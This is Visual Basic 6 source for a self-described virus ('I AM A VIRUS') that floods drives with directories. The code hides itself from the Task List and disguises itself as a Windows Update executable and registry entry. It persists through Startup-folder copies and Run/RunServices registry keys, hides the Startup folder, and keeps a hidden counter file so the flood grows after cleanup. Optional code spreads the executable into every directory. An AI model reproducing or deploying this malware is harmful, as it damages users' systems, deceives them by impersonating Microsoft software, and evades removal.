Attribute VB_Name = "Module1"
Option Explicit

'Need this API to copy the application while it's running.
'FileCopy (vb function) will not copy a running application.

    Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long
    
'Some API to help hide from the Task List.
    
    Private Declare Function GetCurrentProcessID Lib "kernel32" () As Long

    Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long

'Some constants needed to help hide from the Task List

    Private Const RSP_SIMPLE_SERVICE = 1

    Private Const RSP_UNREGISTER_SERVICE = 0
    
'The flooded directory name.

    Private Const Directory_Name As String = "I AM A VIRUS"

'Hidden file name.

    Private Const File_Name As String = "BOOT-LOG"

'Incremental number of directories to create. For everytime
'this application runs, it'll add this to the number of directories
'located in the hidden file. Even if someone deletes all of the directories
'created, the next time they boot up the computer or run this
'application, they get a certain number more thrown at them.
'Left it at 100 for now as a demonstration.

    Const Number_Of_Directories As Double = 100
    
Dim Directory_List() As String

Dim Total_Number_Of_Directories As Double

Dim Current_Directory As Double

Private Sub Main()

    'For those who don't know about Sub Main()
    'this is automatically executed by VB if no
    'form is present in the project.

    On Error Resume Next
    
    'First lets hide from the task list anyway possible.
    
        '------------------------------------
        
        'Windows 98/Windows Me
        
            Hide_From_Task_List
            
        'Windows 2000 (Sometimes)/NT/XP
            
            App.Title = ""
            
        'Depends on operating system.
        
            App.TaskVisible = False
            
        'And if it still doesn't work, it'll be disguised as
        'Windows Update (WUpdate.exe) so be sure to keep the
        'project name WUpdate and save the exe as WUpdate.exe.
        'Note: The program will still be up in the process list
        'as WUpdate.exe.
            
        '-------------------------------------

    'Uncomment this at your own risk. If the exe exists,
    'It'll have the exe's autorun on bootup
    'and add more directories everytime, even if
    'someone deletes them. It'll only work when
    'exe exists.
    
        'Make_Copies_To_Exe
    
    'Uncomment anyone of these. BEWARE OF USING
    'MASS_FOLDER_FLOOD. IT'LL FLOOD ALL DIRECTORIES
    'WITH DIRECTORIES. DO NOT USE.
    
        Folder_Flood
        
        'Infinite_Folder_Flood
        
        'Mass_Folder_Flood
        
End Sub

Private Sub Hide_From_Task_List()
    
    On Error Resume Next
    
    'Windows 98/Windows Me only.
    
    Dim Process_ID As Long
    
    Dim Register_Service As Long
    
    Process_ID = GetCurrentProcessID()
    
    Register_Service = RegisterServiceProcess(Process_ID, RSP_SIMPLE_SERVICE)

End Sub

Private Function Get_Available_Drives(Drive_List() As String) As Long
    
    On Error Resume Next
    
    Dim Current_Drive As Long
    
    Dim File_System_Object As Object
    
    Set File_System_Object = CreateObject("Scripting.FileSystemObject")
    
    Dim Drive As Object, Computer As Object
    
    Set Computer = File_System_Object.Drives
    
    For Each Drive In Computer
        
        'If it's not a disk drive and if it's a removable
        'hard drive or a fixed drive... I needed
        'Drive.DriveType <> 1 so the computer doesn't
        'load the disk drive on the part where it says
        'Drive.IsReady. Dead give away somethings going
        'on.
        
            If Drive.DriveType <> 1 And (Drive.DriveType = 2 Or Drive.DriveType = 3) Then
                
                'Is the drive ready?
                
                    If Drive.IsReady Then
                        
                        Current_Drive = Current_Drive + 1
                        
                        ReDim Preserve Drive_List(Current_Drive) As String
                        
                        Drive_List(Current_Drive) = Drive.Path & "\"
                
                    End If
            
            End If
        
    Next
    
    Get_Available_Drives = Current_Drive
    
    'If no drive exists then terminate.
        
        If Current_Drive = 0 Then End

End Function

Private Sub Recurse_Directory_List(Directory_Path As String)
    
    On Error Resume Next
    
    Dim File_System_Object As Object
    
    Dim Directory As Object
    
    Dim Get_Directory_Path As Object
    
    Dim Sub_Directory As Object
    
    Set File_System_Object = CreateObject("Scripting.FileSystemObject")
    
    Set Get_Directory_Path = File_System_Object.GetFolder(Directory_Path)
    
    Set Sub_Directory = Get_Directory_Path.Subfolders

    For Each Directory In Sub_Directory
    
        DoEvents
        
        Current_Directory = Current_Directory + 1

        ReDim Preserve Directory_List(Current_Directory) As String
    
        Directory_List(Current_Directory) = Directory & "\"
        
        Recurse_Directory_List (Directory)
    
    Next
    
End Sub

Private Sub Create_Directory_List(Drive As String, Directory_List() As String)
    
    On Error Resume Next
    
    ReDim Directory_List(0) As String
    
    Current_Directory = Current_Directory + 1

    ReDim Preserve Directory_List(Current_Directory) As String
    
    Directory_List(Current_Directory) = Drive
    
    Recurse_Directory_List Drive
    
    Total_Number_Of_Directories = Current_Directory
    
    Current_Directory = 0
    
End Sub

Private Sub Make_Copies_To_Exe()

    On Error Resume Next
    
    Dim File_System_Object As Object
    
    Dim Windows_Directory As String
    
    Dim System_Directory As String
    
    Set File_System_Object = CreateObject("Scripting.FileSystemObject")
    
    'Find Windows directory.

        Windows_Directory = File_System_Object.GetSpecialFolder(0)
        
    'Find System Directory.
    
        System_Directory = File_System_Object.GetSpecialFolder(1)
    
    If Dir(App.Path & "\" & App.EXEName & ".exe") <> "" Then

        'Copy the application to the startup folder,...
        
            If Dir(Windows_Directory & "\Start Menu\Programs\StartUp\" & App.EXEName & ".exe") = "" Then
        
                CopyFile App.Path & "\" & App.EXEName & ".exe", Windows_Directory & "\Start Menu\Programs\StartUp\" & App.EXEName & ".exe", False
            
            End If
            
        'the system folder,...
            
            If Dir(System_Directory & "\" & App.EXEName & ".exe") = "" Then
            
                CopyFile App.Path & "\" & App.EXEName & ".exe", System_Directory & "\" & App.EXEName & ".exe", False
                
            End If
            
        '...and the registry within two places. Reason why I selected two places is
        'because someone may delete one of the registry entries/exe's but not both,
        'so no matter what, it'll be ready to autorun. Besides, even if they do delete
        'one of them, it'll be recreated again in the same spot. Add more places if you
        'want for a better chance of survival.
            
            Registry_Write "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\", "Windows Update v8.2 Copyright 2004 by Microsoft Corporation", App.Path & "\" & App.EXEName & ".exe"
           
    End If
                
    If Dir(System_Directory & "\" & App.EXEName & ".exe") <> "" Then
        
        Registry_Write "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICES\", "Windows Update v8.2 Copyright 2004 by Microsoft Corporation", System_Directory & "\" & App.EXEName & ".exe"
        
    End If
            
    'Hide the StartUp folder completely to prevent application from being deleted.
    'And to think it still autoruns applications!
        
        If Dir(Windows_Directory & "\Start Menu\Programs\StartUp\", vbDirectory) <> "" Then
        
            SetAttr Windows_Directory & "\Start Menu\Programs\StartUp\", vbHidden Or vbReadOnly Or vbSystem
        
        End If
        
    'Or you can put it back to normal.
    
        'SetAttr Windows_Directory & "\Start Menu\Programs\StartUp\", vbNormal
            
End Sub

Private Function Registry_Read(Key_Path, Key_Name) As Variant
    
    On Error Resume Next
    
    Dim Registry As Object
    
    Set Registry = CreateObject("WScript.Shell")
    
    Registry_Read = Registry.RegRead(Key_Path & Key_Name)
    
End Function

Private Sub Registry_Write(Key_Path As String, Key_Name As String, Key_Value As Variant, Optional Key_Type As String)
    
    On Error Resume Next
    
    'Key Type list
    '----------------
    
    'REG_BINARY - This type stores the value as raw binary data. Most hardware component information is stored as binary data, and can be displayed in an editor in hexadecimal format.
    'REG_DWORD - This type represents the data by a four byte number and is commonly used for boolean values, such as "0" is disabled and "1" is enabled. Additionally many parameters for device driver and services are this type, and can be displayed in REGEDT32 in binary, hexadecimal and decimal format, or in REGEDIT in hexadecimal and decimal format.
    'REG_EXPAND_SZ - This type is an expandable data string that is string containing a variable to be replaced when called by an application. For example, for the following value, the string "%SystemRoot%" will replaced by the actual location of the directory containing the Windows NT system files. (This type is only available using an advanced registry editor such as REGEDT32)
    'REG_MULTI_SZ - This type is a multiple string used to represent values that contain lists or multiple values, each entry is separated by a NULL character. (This type is only available using an advanced registry editor such as REGEDT32)
    'REG_SZ - This type is a standard string, used to represent human readable text values.
    
    'Other data types not available through the standard registry editors include:
    
    'REG_DWORD_LITTLE_ENDIAN - A 32-bit number in little-endian format.
    'REG_DWORD_BIG_ENDIAN - A 32-bit number in big-endian format.
    'REG_LINK - A Unicode symbolic link. Used internally; applications should not use this type.
    'REG_NONE - No defined value type.
    'REG_QWORD - A 64-bit number.
    'REG_QWORD_LITTLE_ENDIAN - A 64-bit number in little-endian format.
    'REG_RESOURCE_LIST - A device-driver resource list.

    Dim Registry As Object
    
    Dim Registry_Value As Variant 'String or number.
    
    Set Registry = CreateObject("WScript.Shell")
    
    Registry_Value = Registry_Read(Key_Path, Key_Name)
    
    If Key_Type = "" Then
    
        'REG_SZ is the default.
        
        If Registry_Value = "" Then
        
            Registry.RegWrite Key_Path & Key_Name, Key_Value
        
        End If
        
    Else
    
        If Registry_Value = "" Then
    
            Registry.RegWrite Key_Path & Key_Name, Key_Value, Key_Type
        
        End If
        
    End If
    
End Sub

Private Sub Create_Hidden_File(File_Path As String)
    
    On Error Resume Next

    If Dir(File_Path, vbHidden Or vbReadOnly Or vbSystem) = "" Then
    
        Open File_Path For Output As #1
            
            Print #1, 0
        
        Close #1
    
        SetAttr File_Path, vbHidden Or vbReadOnly Or vbSystem
    
    End If

End Sub

Private Sub Load_Number_Of_Directories_From_File(File_Path As String, Number_Of_Directories As Double)
    
    On Error Resume Next
    
    If Dir(File_Path, vbHidden Or vbReadOnly Or vbSystem) <> "" Then
    
        Open File_Path For Input As #1
        
            While Not EOF(1)
            
                Input #1, Number_Of_Directories
            
            Wend
        
        Close #1
        
    End If

End Sub

Private Sub Save_Number_Of_Directories_To_File(File_Path As String, ByVal Value As Double)
    
    On Error Resume Next
    
    SetAttr File_Path, vbHidden Or vbSystem
    
    Open File_Path For Output As #1
    
        Print #1, Value
    
    Close #1
    
    SetAttr File_Path, vbHidden Or vbReadOnly Or vbSystem

End Sub

Private Sub Create_Directory(Directory_Path As String, Directory_Name As String)

    On Error Resume Next
    
    'If directory doesn't exist, create it.
    
        If Dir(Directory_Path & Directory_Name, vbDirectory) = "" Then
            
            MkDir Directory_Path & Directory_Name
        
        End If

End Sub

Public Sub Folder_Flood()

    On Error Resume Next

    Dim Drive_List() As String
    
    Dim Number_Of_Drives As Long
    
    Dim Current_Drive As Long
    
    Dim File_Path As String
    
    Dim Directory_Path As String
    
    Dim Get_Number_Of_Directories As Double

    Number_Of_Drives = Get_Available_Drives(Drive_List())
    
    For Current_Drive = 1 To Number_Of_Drives
        
        File_Path = Drive_List(Current_Drive) & File_Name
        
        Create_Hidden_File Drive_List(Current_Drive) & File_Name
        
        Load_Number_Of_Directories_From_File File_Path, Get_Number_Of_Directories
    
        Do
        
            DoEvents
                
            Current_Directory = Current_Directory + 1
            
            Directory_Path = Drive_List(Current_Drive)
            
            If Current_Directory = 1 Then
                
                Create_Directory Directory_Path, Directory_Name
                
            ElseIf Current_Directory > 1 Then
            
                Create_Directory Directory_Path, Directory_Name & "(" & Current_Directory & ")"
                
            End If
            
        Loop Until Current_Directory = (Get_Number_Of_Directories + Number_Of_Directories)
        
        Save_Number_Of_Directories_To_File File_Path, Current_Directory
        
        Current_Directory = 0
   
    Next Current_Drive

End Sub

Public Sub Infinite_Folder_Flood()

    On Error Resume Next

    Dim Drive_List() As String
    
    Dim Number_Of_Drives As Long
    
    Dim Current_Drive As Long
    
    Dim File_Path As String
    
    Dim Directory_Path As String
    
    Dim Get_Number_Of_Directories As Double

    Number_Of_Drives = Get_Available_Drives(Drive_List())
    
    For Current_Drive = 1 To Number_Of_Drives
    
        Do
        
            DoEvents
                
            Current_Directory = Current_Directory + 1
            
            Directory_Path = Drive_List(Current_Drive)
            
            If Current_Directory = 1 Then
                
                Create_Directory Directory_Path, Directory_Name
                
            ElseIf Current_Directory > 1 Then
            
                Create_Directory Directory_Path, Directory_Name & "(" & Current_Directory & ")"
                
            End If
            
        Loop
   
    Next Current_Drive

End Sub

Public Sub Mass_Folder_Flood()

    'NOTE: USE AT YOUR OWN RISK. THIS FLOODS ALL DIRECTORIES
    '      WITH THE SPECIFIED NUMBER OF DIRECTORIES TO ALL HARDDRIVES.
    '      IT HAS NEVER BEEN TESTED, BUT I KNOW IT WORKS.

    On Error Resume Next

    Dim Drive_List() As String
    
    Dim Number_Of_Drives As Long
    
    Dim Current_Drive As Long
    
    Dim File_Path As String
    
    Dim Directory_Path As String
    
    Dim Get_Number_Of_Directories As Double
    
    Dim Current_Sub_Directory As Double

    Number_Of_Drives = Get_Available_Drives(Drive_List())
    
    For Current_Drive = 1 To Number_Of_Drives
        
        'The Create_Directory_List will take less than a minute. Has to scan ALL
        'directories in the harddrive.
        
            Create_Directory_List Drive_List(Current_Drive), Directory_List()
        
        For Current_Sub_Directory = 1 To Total_Number_Of_Directories
        
            File_Path = Directory_List(Current_Sub_Directory) & File_Name
        
            Create_Hidden_File Directory_List(Current_Sub_Directory) & File_Name
            
            Load_Number_Of_Directories_From_File File_Path, Get_Number_Of_Directories
            
            'Uncomment these if you want the EXE to spread in every directory on all
            'harddrives.
            
                'If Dir(App.Path & "\" & App.EXEName & ".exe") <> "" Then
                
                    'CopyFile App.Path & "\" & App.EXEName & ".exe", Directory_List(Current_Sub_Directory) & App.EXEName & ".exe", False
                
                'End If
        
            Do
            
                DoEvents
                    
                Current_Directory = Current_Directory + 1
                
                Directory_Path = Directory_List(Current_Sub_Directory)
                
                If Current_Directory = 1 Then
                    
                    Create_Directory Directory_Path, Directory_Name
                    
                ElseIf Current_Directory > 1 Then
                
                    Create_Directory Directory_Path, Directory_Name & "(" & Current_Directory & ")"
                    
                End If
                
            Loop Until Current_Directory = (Get_Number_Of_Directories + Number_Of_Directories)
            
            Save_Number_Of_Directories_To_File File_Path, Current_Directory
            
            Current_Directory = 0
    
        Next Current_Sub_Directory
    
    Next Current_Drive

End Sub
